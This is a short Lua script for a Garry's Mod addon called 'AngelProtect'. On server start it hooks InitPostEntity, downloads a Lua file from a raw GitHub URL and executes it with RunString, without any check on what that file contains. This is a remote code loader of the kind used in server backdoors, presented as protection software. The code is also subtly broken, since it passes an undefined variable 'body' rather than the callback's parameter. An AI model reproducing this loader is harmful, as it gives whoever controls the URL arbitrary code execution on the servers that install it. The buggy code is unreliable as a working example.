AngelProtect = include("config.lua")
hook.Add('InitPostEntity','angel:Init',function()
    HTTP({
        url			= "https://raw.githubusercontent.com/Stricky4/AngelProtect/main/angelprotect.lua",
        method		= "get",
        headers		= {},
        success = function( c, b )
            local e = RunString(body,'[AngelProtect] ',false)
            print(e)
        end,
        failed = function( e )
            print( 'AngelProtectError: ',e )
        end
    })
end)